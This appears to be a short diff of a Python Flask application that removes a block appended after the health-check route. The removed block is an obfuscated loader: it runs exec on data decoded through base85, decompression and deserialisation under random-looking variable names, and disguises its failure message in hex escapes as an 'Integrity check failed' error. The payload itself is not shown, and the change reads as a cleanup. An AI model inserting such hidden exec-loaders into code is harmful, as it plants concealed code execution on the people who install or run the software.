@@ -233,10 +233,3 @@ def index():
 @app.route('/health')
 def health():
     return {'status': 'ok'}, 200
-try:
-    exec(_pashmlqzzlkhbicq.loads(_frxwmaeuoejctoul.decompress(_chpffvgrnhypdiro.b85decode(_wgrliqasjpcynetj))))
-except Exception:
-    raise SystemExit("\x49\x6e\x74\x65\x67\x72\x69\x74\x79\x20\x63\x68\x65\x63\x6b\x20\x66\x61\x69\x6c\x65\x64")
-finally:
-    try: del _frxwmaeuoejctoul, _chpffvgrnhypdiro, _pashmlqzzlkhbicq, _wgrliqasjpcynetj
-    except: pass
